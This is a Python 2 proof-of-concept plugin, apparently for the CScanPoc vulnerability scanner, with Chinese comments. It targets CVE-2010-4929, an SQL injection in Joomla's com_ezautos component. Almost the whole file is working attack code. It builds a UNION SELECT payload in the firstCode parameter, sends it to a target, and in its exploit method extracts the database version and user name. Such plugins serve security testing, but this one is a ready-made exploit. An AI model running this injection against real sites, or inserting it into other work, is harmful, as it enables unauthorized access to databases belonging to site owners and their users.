# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '121ddef4-78e4-4328-aefa-1799690208f5'
    name = 'Joomla Component (com_ezautos) SQL Injection Vulnerability' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-10-09'  # 漏洞公布时间
    desc = '''
        joomla组件com_ezautos存在SQL注入漏洞，
        远程攻击者可借助index.php中的helpers操作的firstCode参数执行任意SQL命令。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-69896' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'CVE-2010-4929'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5c95f248-8f86-48b9-a1b7-52b03f61abeb' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #利用的payload
            payload="1+and+0+union+select+1,2,concat('$~~~$',version(),'***',user(),'$~~~$'),4,5,6,7--"
            #漏洞地址
            exploit='/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
            #构造访问地址
            vul_url = arg + exploit + payload
            response = requests.get(vul_url).content
            #自定义的HTTP头
            httphead = {
            'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection':'keep-alive'
            }
            #正则表达式
            par="\$~~~\$([0-9a-zA-Z_].*)\*\*\*([0-9a-zA-Z_].*)\$~~~\$"
            #访问
            resp=requests.get(url=vul_url,headers=httphead,timeout=50)
            #检查是否有特殊字符串
            if '$~~~$' in resp.content:
                match=re.search(par,resp.content,re.I|re.M)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #利用的payload
            payload="1+and+0+union+select+1,2,concat('$~~~$',version(),'***',user(),'$~~~$'),4,5,6,7--"
            #漏洞地址
            exploit='/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
            #构造访问地址
            vul_url = arg + exploit + payload
            response = requests.get(vul_url).content
            #自定义的HTTP头
            httphead = {
            'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection':'keep-alive'
            }
            #正则表达式
            par="\$~~~\$([0-9a-zA-Z_].*)\*\*\*([0-9a-zA-Z_].*)\$~~~\$"
            #访问
            resp=requests.get(url=vul_url,headers=httphead,timeout=50)
            #检查是否有特殊字符串
            if '$~~~$' in resp.content:
                match=re.search(par,resp.content,re.I|re.M)
                if match:
                    #数据库版本
                    dbversion = match.group(1)
                    #数据库用户
                    dbusername = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户为{dbusername} 数据库版本为{dbversion}'.format(target=self.target,name=self.vuln.name,dbusername=dbusername,dbversion=dbversion)) 
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()